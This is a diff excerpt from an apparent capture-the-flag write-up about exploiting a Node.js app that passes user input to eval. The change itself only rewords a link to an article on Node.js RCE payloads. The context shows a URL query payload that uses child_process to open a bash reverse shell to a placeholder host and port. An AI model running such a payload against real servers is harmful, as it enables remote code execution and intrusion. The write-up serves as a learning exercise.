@@ -23,7 +23,7 @@ module.exports = {
 ```
 
 The program is using eval function on user_input. We'll tried to exploit it by using that input.
-You can find node js rce payload [Link Here](https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44)
+You can find NodeJs RCE Payloads [Here](https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44)
 I used this one but a little modified for to be compitable with the challenge
 ```
 /?q=require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/nc_host/nc_port+0>%261"')
